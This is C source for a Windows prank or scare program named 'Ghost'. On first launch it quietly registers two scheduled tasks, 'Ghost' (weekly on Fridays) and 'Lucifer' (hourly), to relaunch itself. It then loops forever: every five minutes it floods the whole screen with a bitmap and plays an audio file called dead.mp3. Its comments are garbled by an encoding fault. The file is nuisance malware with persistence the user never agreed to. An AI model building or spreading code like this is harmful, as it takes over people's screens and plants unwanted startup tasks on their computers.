#include <windows.h>
#include"GhostMain.h" 

//extern char Path[MAX_PATH];
//extern BOOL IsMusic;

char Path[MAX_PATH];
BOOL IsMusic;

//music thread
DWORD WINAPI ThreadFunc(LPVOID lpParam) //�̺߳���������ͨ�ĺ���ûʲô����
{
	char strShow[MAX_PATH] = { 0 }, strPlay[MAX_PATH] = { 0 };
	if (IsMusic) {
		GetDir(strShow);
		strcat(strShow, "dead.mp3");
		sprintf(strPlay, "open %s Alias ShowMusic", strShow);
		mciSendStringA(strPlay, "", 0, NULL);
		mciSendStringA("play ShowMusic", "", 0, NULL);
	}
	return 0;
}

void SetSchtasks() {
	char Path[MAX_PATH] = { 0 };
	char PathShow[MAX_PATH + 100] = { 0 };
	GetModuleFileNameA(NULL, Path, MAX_PATH); //�ƻ�����ÿ��������
	sprintf(PathShow, "schtasks /create /tn \"Ghost\" /tr %s /sc weekly /d FRI", Path);
	system(PathShow);
	//���60���Ӻ�����
	sprintf(PathShow, "schtasks /create /sc minute /mo 60 /tn \"Lucifer\" /tr %s", Path);
	system(PathShow);
}

void IsYouComeBack() {
	DWORD dwThreadId, dwThrdParam = 1;
	int cxClient = GetSystemMetrics(SM_CXSCREEN);
	int cyClient = GetSystemMetrics(SM_CYSCREEN);
	HBITMAP LoadBmp = (HBITMAP)(HBITMAP)LoadImage(GetModuleHandle(NULL), TEXT("gui2.bmp"), IMAGE_BITMAP, 800, 600, LR_LOADFROMFILE);//����ͼƬ 
	HDC hdc = GetDC(NULL);//�õ���Ӧ��������DC
	HDC hdcMem = CreateCompatibleDC(hdc);//������ʱDC
	HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMem, LoadBmp);//��ͼƬѡ��DC
	int num = 0;
	CloseHandle(CreateThread(NULL, 0, ThreadFunc, &dwThrdParam, 0, &dwThreadId));
	for (num = 0;num < 5000;num++) {
		BitBlt(hdc, 0, 0, cxClient, cyClient, hdcMem, 0, 0, SRCCOPY);//��ͼ
	}
	SelectObject(hdcMem, hbmOld);
	DeleteDC(hdcMem);
	InvalidateRect(NULL, NULL, 1);
}


//��ȡ��ǰĿ¼
void GetDir(char *DIRFile) {
	char EXEFile[MAX_PATH] = { 0 };
	int i;int j = 0;
	GetModuleFileNameA(NULL, EXEFile, MAX_PATH);
	i = strlen(EXEFile);
	for (;(EXEFile[i] != '\\') && (EXEFile[i] != '/');i--);
	for (;j <= i;j++) {
		DIRFile[j] = EXEFile[j];
	}
	DIRFile[++j] = '\0';
}

BOOL FindFirstFileExists(LPCTSTR lpPath, DWORD dwFilter)
{
	WIN32_FIND_DATA fd;
	HANDLE hFind = FindFirstFile(lpPath, &fd);
	BOOL bFilter = (FALSE == dwFilter) ? TRUE : fd.dwFileAttributes & dwFilter;
	BOOL RetValue = ((hFind != INVALID_HANDLE_VALUE) && bFilter) ? TRUE : FALSE;
	FindClose(hFind);
	return RetValue;
}

BOOL FolderExists(char* Path)
{
	TCHAR lpPath[MAX_PATH];
	MultiByteToWideChar(0, 0, Path, MAX_PATH, lpPath, MAX_PATH);
	return FindFirstFileExists(lpPath, FILE_ATTRIBUTE_DIRECTORY);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
{
	HANDLE m_hMutex = CreateMutex(NULL, FALSE, L"Lucifer");//����������
	DWORD TIMER = 300000; //Ů����ֵļ��ʱ��
	// ���������
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		// ������л������������ͷž������λ������
		CloseHandle(m_hMutex);
		m_hMutex = NULL;
		// �����˳�
		return FALSE;
	}
	GetDir(Path);//��ǰ·��
	strcat(Path, "Dead");
	if (!FolderExists(Path)) { //�ļ����Ƿ����
		CreateDirectoryA(Path, NULL);//�����ļ���
		SetSchtasks();//�ƻ�����
		MessageBox(NULL, L"CCDAYE", L"��С���¡����������", MB_OK);
	}
	Sleep(TIMER);
	while (1) {
		IsMusic = TRUE;
		IsYouComeBack();//Ů���û
		IsMusic = FALSE;
		Sleep(TIMER);
	}
	return 0;
}